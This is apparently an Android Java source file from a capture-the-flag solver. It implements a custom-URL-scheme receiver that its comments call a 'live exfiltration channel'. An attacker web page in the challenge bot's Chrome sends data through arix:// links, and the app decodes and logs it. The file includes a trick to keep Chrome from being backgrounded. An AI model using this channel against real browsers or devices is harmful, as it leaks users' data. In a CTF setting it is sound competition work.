package xyz.ariadnetab.solver;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;

import java.net.URLDecoder;

/**
 * The live exfiltration channel.
 *
 * The attacker page runs on https://content.ariadnetab.xyz inside the bot's
 * Chrome and cannot reach logcat. Navigating the TOP-LEVEL document to an
 * `arix://` URL makes Chrome resolve it as an external protocol and hand it to
 * whichever app claims the scheme, which is us. `getDataString()` therefore
 * carries whatever the page wanted to say, and we print it under the TFCCTF tag
 * where the android.koth.pro platform log picks it up DURING the run.
 *
 * Theme.NoDisplay plus finish() in onCreate means Chrome is never backgrounded,
 * which matters: a backgrounded Chrome tab has its timers throttled to about
 * once a minute and that silently killed an earlier run.
 */
public final class Recv extends Activity {

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        try {
            Uri data = getIntent() == null ? null : getIntent().getData();
            if (data != null && "arix".equals(data.getScheme())) {
                report(data);
            } else {
                MainActivity.log(">>> Recv (non-arix)");
                MainActivity.dumpIntent(getIntent(), "recv");
            }
        } catch (Throwable error) {
            MainActivity.log(">>> Recv FAILED " + error);
            MainActivity.dumpIntent(getIntent(), "recv-raw");
        }
        finish();
    }

    /** Pull the beacon fields out by hand. Uri.getQueryParameter() throws on a
     *  malformed pair and would drop the whole message, so decode manually. */
    private static void report(Uri data) {
        String query = data.getEncodedQuery();
        String kind = "?", run = "?", part = "?", ms = "?", body = "";
        if (query != null) {
            for (String pair : query.split("&")) {
                int eq = pair.indexOf('=');
                if (eq <= 0) continue;
                String name = pair.substring(0, eq);
                String value = decode(pair.substring(eq + 1));
                if ("k".equals(name)) kind = value;
                else if ("r".equals(name)) run = value;
                else if ("i".equals(name)) part = value;
                else if ("ms".equals(name)) ms = value;
                else if ("d".equals(name)) body = value;
            }
        }
        MainActivity.log("PAGE r" + run + " " + ms + "ms [" + kind + " " + part + "] " + body);
    }

    private static String decode(String value) {
        try {
            return URLDecoder.decode(value, "UTF-8");
        } catch (Throwable error) {
            return value;
        }
    }
}
